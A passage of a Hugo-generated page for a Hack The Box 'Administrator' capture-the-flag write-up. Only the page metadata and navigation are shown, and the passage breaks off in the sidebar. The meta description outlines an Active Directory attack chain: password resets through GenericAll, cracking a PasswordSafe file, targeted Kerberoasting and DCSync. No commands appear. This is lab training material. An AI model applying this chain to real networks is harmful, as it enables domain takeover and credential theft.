@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+<link rel="icon" href="/favicon-dark.svg" type="image/svg+xml" media="(prefers-color-scheme: dark)" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>Administrator - Hack The Box  – Z4kr Security.</title>
+  <meta name="description" content="
+This Hack The Box Administrator machine is focused on exploitation of Active Directory weaknesses. Starting with user credentials, we used Bloodhound to map the domain, quickly identifying exploitable GenericAll permissions that allowed us to reset passwords using tools like net rpc.
+Our investigation then uncovered an FTP server with a PasswordSafe file. Cracking this file with pwsafe2john and John the Ripper provided further credentials, which we leveraged to exploit ForceChangePassword privileges and perform a targeted Kerberoast for even higher access. The final step involved a DCSync attack via Impacket, retrieving domain admin hashes and granting complete control. This showcases a direct path from initial access to domain dominance by chaining AD misconfigurations and service vulnerabilities." /><link rel="canonical" href="http://localhost:1313/htb/medium/administrator/" itemprop="url" />
+
+<meta property="og:title" content="Administrator - Hack The Box " />
+<meta property="og:description" content="
+This Hack The Box Administrator machine is focused on exploitation of Active Directory weaknesses. Starting with user credentials, we used Bloodhound to map the domain, quickly identifying exploitable GenericAll permissions that allowed us to reset passwords using tools like net rpc.
+Our investigation then uncovered an FTP server with a PasswordSafe file. Cracking this file with pwsafe2john and John the Ripper provided further credentials, which we leveraged to exploit ForceChangePassword privileges and perform a targeted Kerberoast for even higher access. The final step involved a DCSync attack via Impacket, retrieving domain admin hashes and granting complete control. This showcases a direct path from initial access to domain dominance by chaining AD misconfigurations and service vulnerabilities." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/htb/medium/administrator/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2025-04-29T00:05:30-04:00" />
+<meta property="article:modified_time" content="2025-04-29T00:05:30-04:00" />
+
+  <meta itemprop="name" content="Administrator - Hack The Box ">
+  <meta itemprop="description" content="This Hack The Box Administrator machine is focused on exploitation of Active Directory weaknesses. Starting with user credentials, we used Bloodhound to map the domain, quickly identifying exploitable GenericAll permissions that allowed us to reset passwords using tools like net rpc.
+Our investigation then uncovered an FTP server with a PasswordSafe file. Cracking this file with pwsafe2john and John the Ripper provided further credentials, which we leveraged to exploit ForceChangePassword privileges and perform a targeted Kerberoast for even higher access. The final step involved a DCSync attack via Impacket, retrieving domain admin hashes and granting complete control. This showcases a direct path from initial access to domain dominance by chaining AD misconfigurations and service vulnerabilities.">
+  <meta itemprop="datePublished" content="2025-04-29T00:05:30-04:00">
+  <meta itemprop="dateModified" content="2025-04-29T00:05:30-04:00">
+  <meta itemprop="wordCount" content="1444">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Administrator - Hack The Box ">
+  <meta name="twitter:description" content="This Hack The Box Administrator machine is focused on exploitation of Active Directory weaknesses. Starting with user credentials, we used Bloodhound to map the domain, quickly identifying exploitable GenericAll permissions that allowed us to reset passwords using tools like net rpc.
+Our investigation then uncovered an FTP server with a PasswordSafe file. Cracking this file with pwsafe2john and John the Ripper provided further credentials, which we leveraged to exploit ForceChangePassword privileges and perform a targeted Kerberoast for even higher access. The final step involved a DCSync attack via Impacket, retrieving domain admin hashes and granting complete control. This showcases a direct path from initial access to domain dominance by chaining AD misconfigurations and service vulnerabilities.">
+
+    <link href="/css/compiled/main.css" rel="stylesheet" />
+
+
+
+  <link href="/css/custom.css" rel="stylesheet" />
+
+
+  <script>
+     
+    const defaultTheme = 'system';
+
+    const setDarkTheme = () => {
+      document.documentElement.classList.add("dark");
+      document.documentElement.style.colorScheme = "dark";
+    }
+    const setLightTheme = () => {
+      document.documentElement.classList.remove("dark");
+      document.documentElement.style.colorScheme = "light";
+    }
+
+    if ("color-theme" in localStorage) {
+      localStorage.getItem("color-theme") === "dark" ? setDarkTheme() : setLightTheme();
+    } else {
+      defaultTheme === "dark" ? setDarkTheme() : setLightTheme();
+      if (defaultTheme === "system") {
+        window.matchMedia("(prefers-color-scheme: dark)").matches ? setDarkTheme() : setLightTheme();
+      }
+    }
+  </script>
+
+  
+  </head>
+<body dir="ltr"><div class="nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div class="nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"></div>
+
+  <nav class="hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-2 hx:h-16 hx:px-6 hx:max-w-[90rem]">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+        <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none" title="Z4kr Security.">Z4kr Security.</span>
+    </a><a
+            title="Home."
+            href="/"
+            
+            class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-block hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+          >
+            <span class="hx:text-center">Home.</span>
+          </a><a
+            title="Pentes Notes."
+            href="/pentest-notes/"
+            
+            class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-block hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+          >
+            <span class="hx:text-center">Pentes Notes.</span>
+          </a><a
+            title="HTB Write-Ups."
+            href="/htb"
+            
+            class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-block hx:font-medium"
+          >
+            <span class="hx:text-center">HTB Write-Ups.</span>
+          </a><a
+            title="About."
+            href="/about"
+            
+            class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-block hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+          >
+            <span class="hx:text-center">About.</span>
+          </a><div class="search-wrapper hx:relative hx:md:w-64">
+  <div class="hx:relative hx:flex hx:items-center hx:text-gray-900 hx:contrast-more:text-gray-800 hx:dark:text-gray-300 hx:contrast-more:dark:text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx:block hx:w-full hx:appearance-none hx:rounded-lg hx:px-3 hx:py-2 hx:transition-colors hx:text-base hx:leading-tight hx:md:text-sm hx:bg-black/[.05] hx:dark:bg-gray-50/10 hx:focus:bg-white hx:dark:focus:bg-dark hx:placeholder:text-gray-500 hx:dark:placeholder:text-gray-400 hx:contrast-more:border hx:contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx:absolute hx:my-1.5 hx:select-none hx:ltr:right-1.5 hx:rtl:left-1.5 hx:h-5 hx:rounded-sm hx:bg-white hx:px-1.5 hx:font-mono hx:text-[10px] hx:font-medium hx:text-gray-500 hx:border hx:border-gray-200 hx:dark:border-gray-100/20 hx:dark:bg-dark/50 hx:contrast-more:border-current hx:contrast-more:text-current hx:contrast-more:dark:border-current hx:items-center hx:gap-1 hx:transition-opacity hx:pointer-events-none hx:hidden hx:sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx:hidden hx:border hx:border-gray-200 hx:bg-white hx:text-gray-100 hx:dark:border-neutral-800 hx:dark:bg-neutral-900 hx:absolute hx:top-full hx:z-20 hx:mt-2 hx:overflow-auto hx:overscroll-contain hx:rounded-xl hx:py-2.5 hx:shadow-xl hx:max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] hx:md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx:inset-x-0 hx:ltr:md:left-auto hx:rtl:md:right-auto hx:contrast-more:border hx:contrast-more:border-gray-900 hx:contrast-more:dark:border-gray-50 hx:w-screen hx:min-h-[100px] hx:max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+<button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx:cursor-pointer hx:group hx:h-7 hx:rounded-md hx:px-2 hx:text-left hx:text-xs hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="hx:group-data-[theme=light]:hidden">Light</span><svg height=12 class="hx:group-data-[theme=dark]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="hx:group-data-[theme=dark]:hidden">Dark</span></div>
+</button>
+<button type="button" aria-label="Menu" class="hamburger-menu hx:cursor-pointer hx:-mr-2 hx:rounded-sm hx:p-2 hx:active:bg-gray-400/20 hx:md:hidden"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class='hx:mx-auto hx:flex hx:max-w-screen-xl'>
+    <aside class="sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-16 hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:sticky">
+  
+  <div class="hx:px-4 hx:pt-4 hx:md:hidden">
+    <div class="search-wrapper hx:relative hx:md:w-64">
+  <div class="hx:relative hx:flex hx:items-center hx:text-gray-900 hx:contrast-more:text-gray-800 hx:dark:text-gray-300 hx:contrast-more:dark:text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx:block hx:w-full hx:appearance-none hx:rounded-lg hx:px-3 hx:py-2 hx:transition-colors hx:text-base hx:leading-tight hx:md:text-sm hx:bg-black/[.05] hx:dark:bg-gray-50/10 hx:focus:bg-white hx:dark:focus:bg-dark hx:placeholder:text-gray-500 hx:dark:placeholder:text-gray-400 hx:contrast-more:border hx:contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx:absolute hx:my-1.5 hx:select-none hx:ltr:right-1.5 hx:rtl:left-1.5 hx:h-5 hx:rounded-sm hx:bg-white hx:px-1.5 hx:font-mono hx:text-[10px] hx:font-medium hx:text-gray-500 hx:border hx:border-gray-200 hx:dark:border-gray-100/20 hx:dark:bg-dark/50 hx:contrast-more:border-current hx:contrast-more:text-current hx:contrast-more:dark:border-current hx:items-center hx:gap-1 hx:transition-opacity hx:pointer-events-none hx:hidden hx:sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx:hidden hx:border hx:border-gray-200 hx:bg-white hx:text-gray-100 hx:dark:border-neutral-800 hx:dark:bg-neutral-900 hx:absolute hx:top-full hx:z-20 hx:mt-2 hx:overflow-auto hx:overscroll-contain hx:rounded-xl hx:py-2.5 hx:shadow-xl hx:max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] hx:md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx:inset-x-0 hx:ltr:md:left-auto hx:rtl:md:right-auto hx:contrast-more:border hx:contrast-more:border-gray-900 hx:contrast-more:dark:border-gray-50 hx:w-screen hx:min-h-[100px] hx:max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      
+          <li class="open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/"
+    
+  >HTB - WriteUps.
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/easy/"
+    
+  >Easy
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a>
+              <div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/easy/sea-htb/"
+    
+  >Sea - Hack The Box
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/easy/analytics-htb/"
+    
+  >Analytics - Hack The Box
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/easy/delivery-htb/"
+    
+  >Delivery - Hack The Box
+    </a>
+              
+            </li></ul>
+      </div>
+            </li><li class="hx:flex hx:flex-col open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/medium/"
+    
+  >Medium
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a>
+              <div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item hx:bg-primary-100 hx:font-semibold hx:text-primary-800 hx:contrast-more:border hx:contrast-more:border-primary-500 hx:dark:bg-primary-400/10 hx:dark:text-primary-600 hx:contrast-more:dark:border-primary-500"
+    href="/htb/medium/administrator/"
+    
+  >Administrator - Hack The Box 
+    </a>
+  
+    <ul class='hx:flex hx:flex-col hx:gap-1 hx:relative hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:dark:before:bg-neutral-800 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:pr-3 hx:rtl:before:right-0 hx:ltr:ml-3 hx:rtl:mr-3'><li>
+              <a
+                href="#enumeration"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Enumeration</a>
+            </li>
+          <li>
+              <a
+                href="#foothold"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Foothold</a>
+            </li>
+          <li>
+              <a
+                href="#passwordsafe3-file"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >PasswordSafe3 File.</a>
+            </li>
+          <li>
+              <a
+                href="#targeted-kerberoast"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Targeted Kerberoast</a>
+            </li>
+          <li>
+              <a
+                href="#dcsync-attack"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >DCSync Attack.</a>
+            </li>
+          <li>
+              <a
+                href="#references"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >References:</a>
+            </li>
+          </ul>
+  
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/medium/survellance-htb/"
+    
+  >Survellance - Hack The Box
+    </a>
+              
+            </li></ul>
+      </div>
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/hard/"
+    
+  >Hard
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/pentest-notes/"
+    
+  >Pentesting Notes
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/pentest-notes/linux/"
+    
+  >Linux
+    </a>
+              
